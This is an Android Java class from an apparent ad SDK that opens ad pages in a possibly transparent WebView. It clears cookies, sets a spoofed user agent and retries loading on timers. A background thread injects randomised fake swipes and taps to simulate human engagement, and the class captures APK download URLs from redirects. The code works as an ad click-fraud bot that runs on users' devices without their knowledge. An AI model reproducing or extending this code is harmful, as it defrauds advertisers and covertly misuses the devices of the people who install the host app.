package com.rbt.vrde.core.ads.core.widget;

import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.os.SystemClock;
import android.view.MotionEvent;
import android.view.View;

import com.rbt.vrde.core.web.component.WebWindow;
import com.rbt.vrde.core.web.widget.CookiesHelper;
import com.rbt.vrde.core.web.widget.WebLayout;
import com.rbt.vrde.utils.StringUtils;
import com.young.myaddemo.Model.AdModel;

import java.util.Random;

/**
 * 思瑞UcApi业务
 */

public class UcApiWindow extends WebWindow implements WebLayout.IWebViewCallback {

    private final static String TAG = "UcApiWindow";
    private WebLayout mView;
    private String mPageTitle;
    private int mRetry;
    private Handler mHandler;
    private boolean mBreakRetry = false;
    private boolean isFinished;
    private static boolean isMotion;

    private static boolean runMotion = false;

    private boolean firstLoadCpt = false;

    private AdModel mAdModel;
    private String mApkPath;

    public UcApiWindow(Context context) {
        super(context);
        mHandler = new Handler(Looper.getMainLooper());
    }

    @Override
    public View createView() {
        mView = new WebLayout(mContext);
        mView.setCallback(this);
        mView.setTransparent(mTransparent);
        if (mTransparent)
            mView.setBackgroundColor(0);
        return mView;
    }
    
    /*public void show(String url, String ua) {
        super.show(url, ua);
    }*/

    public void show(String url, String ua, AdModel m) {
        mAdModel = m;
        super.show(url, ua);
    }

    public void setMotion(boolean motion) {
        //是否下载
        isMotion = motion;
        new MotionThread().start();
    }

    public String getApkPath() {
        return mApkPath;
    }

    @Override
    public void main() {
//        MLog.d(TAG, "---WebView open url:" + mWebUrl);
//        MLog.d(TAG, "---WebView userAgent:" + mUserAgent);
//        MLog.d(TAG, "---WebView motion:" + isMotion);

        CookiesHelper.get(mContext).removeAllCookies();

        if (StringUtils.isNotBlank(mWebUrl)) {
            mView.loadUrl(mWebUrl);
        } else {
            hide();
            return;
        }

        if (StringUtils.isNotBlank(mUserAgent)) {
            mView.setUserAgent(mUserAgent);
        }

        isFinished = false;

        mHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (!mBreakRetry) {
                    mView.loadUrl(mWebUrl);
//                    MLog.d(TAG, "---WebView again open url:" + mWebUrl);
                }
            }
        }, 30 * 1000);

        new Timer().start();
    }


    @Override
    public void onPageRedirected(String url) {

        if (url.contains(com.rbt.vrde.core.res.R.webpage.AdWebView.__apk)) {
//            MLog.e(TAG, "---onPageRedirected:" + url);
            mApkPath = url;
            hide();
        }
    }

    @Override
    public void closeAll() {
//        MLog.i(TAG, "~~~~~~~~~~finish AdWebWindow~~~~~~~~~~");
        isFinished = true;
        mView.onDestroy();
        mView.setVisibility(View.GONE);
    }

    @Override
    public void onReceivedTitle(String title) {
//        MLog.i(TAG, "---onReceivedTitle---title:" + title);
        mPageTitle = title;
    }

    @Override
    public void onPageFinished(String url) {
//        MLog.i(TAG, "---onPageFinished---url:" + url);

        if ("找不到网页".equals(mPageTitle)) {
            mBreakRetry = true;
            mRetry++;
            if (mRetry >= 3) {
                hide();
            } else {
//                MLog.d(TAG, "---WebView Retry :[" + mRetry + "]--open url:" + mWebUrl);
                mView.loadUrl(url);
            }
            return;
        }


        firstLoadCpt = true;

        mBreakRetry = true;

        runMotion = true;

    }

    @Override
    public void onProgress(int num) {

    }

    class Timer extends Thread {
        @Override
        public void run() {

            int time = isMotion ? 100 : 40;
            while (!isFinished && time > 0) {
                time--;
                try {
                    sleep(1 * 1000);
                } catch (InterruptedException e) {
                }

                if (time == 0) {
                    hide();
                }
            }
        }
    }

    class MotionThread extends Thread {

        @Override
        public void run() {

            try {
                int loop = 5 + new Random().nextInt(5);
                while (!isFinished && loop > 0) {

                    if (runMotion) {
                        // 划动
                        randomSlide();

                        // 点击
                        if (isMotion) {
                            randomPoint();
                        }

                        runMotion = false;
                    }
//                    MLog.d(TAG, "---MotionThread wait action...");
                    sleep(2 * 1000);
                    loop--;
                }

                hide();
            } catch (Exception e) {
//                MLog.e(TAG, "---MotionThread Err:" + e.getMessage(), e);
            }
        }

        private void randomSlide() throws InterruptedException {
            int v = createRandomValue(4, 8);

//            MLog.i(TAG, "----随机滑动次数：[" + v + "]");

            while (v > 0) {
                int fromX = (int) (sWidth * (createRandomValue(20, 80) / 100f));
                int fromY = (int) (sHeight * (createRandomValue(20, 80) / 100f));
                int toX = (int) (sWidth * (createRandomValue(20, 80) / 100f));
                int toY = (int) (sHeight * (createRandomValue(20, 80) / 100f));
                slideSync(fromX, fromY, toX, toY);

                v--;
                Thread.sleep(2 * 1000);
            }
        }

        private void randomPoint() throws InterruptedException {
            int v = createRandomValue(5, 8);
            while (v > 0) {
                int fromX = (int) (sWidth * (createRandomValue(20, 80) / 100f));
                int fromY = (int) (sHeight * (createRandomValue(20, 80) / 100f));
                int toX = (int) (sWidth * (createRandomValue(20, 80) / 100f));
                int toY = (int) (sHeight * (createRandomValue(20, 80) / 100f));
                pointSync(fromX, fromY, toX, toY);

                v--;
                Thread.sleep(2 * 1000);
            }
        }

    }

    private void touchEvent(MotionEvent event) {
        try {
            mView.dispatchTouchEvent(event);
        } catch (Throwable t) {
//            MLog.e(TAG, "---touchEvent Err.---");
            hide();
        }
    }

    private void slideSync(int fromX, int fromY, int toX, int toY) {

        long downTime = SystemClock.uptimeMillis();
        long eventTime = SystemClock.uptimeMillis();

        int y = fromY;
        int x = fromX;
        int dis = Math.abs(toY - fromY);
        int step = dis < 50 ? 1 : Math.abs(dis / 50);

        int yStep = (toY - fromY) / step;
        int xStep = (toX - fromX) / step;

        MotionEvent event = MotionEvent.obtain(downTime, eventTime, MotionEvent.ACTION_DOWN, x, y, 0);

        touchEvent(event);
//        MLog.e(TAG, "--滑动---step:[" + step + "]");
//        MLog.d(TAG, "--滑动--down event:" + event);

        for (int i = 0; i < step; ++i) {
            y += yStep;
            x += xStep;
            eventTime += 20;
            event = MotionEvent.obtain(downTime, eventTime, MotionEvent.ACTION_MOVE, x, y, 0);
            touchEvent(event);
        }

        eventTime = SystemClock.uptimeMillis();
        event = MotionEvent.obtain(downTime, eventTime, MotionEvent.ACTION_UP, x, y, 0);
        touchEvent(event);
//        MLog.d(TAG, "--滑动--up event:" + event);
    }


    private void pointSync(int fromX, int fromY, int toX, int toY) {

        int x = createRandomValue(fromX, toX);
        int y = createRandomValue(fromY, toY);

        long downTime = SystemClock.uptimeMillis();
        long eventTime = downTime + 20;
        MotionEvent event_down = MotionEvent.obtain(downTime, eventTime, MotionEvent.ACTION_DOWN, x, y, 0);

        MotionEvent event_up = MotionEvent.obtain(downTime, eventTime, MotionEvent.ACTION_UP, x, y, 0);
//        MLog.d(TAG, "--点击--up event:" + event_down);
        touchEvent(event_down);
        touchEvent(event_up);
    }

    private Integer createRandomValue(int minVal, int maxVal) {
        if (maxVal <= 0) {
            return 0;
        }
        Random random = new Random();
        int s = random.nextInt(maxVal) % (maxVal - minVal + 1) + minVal;
        return s;
    }

}
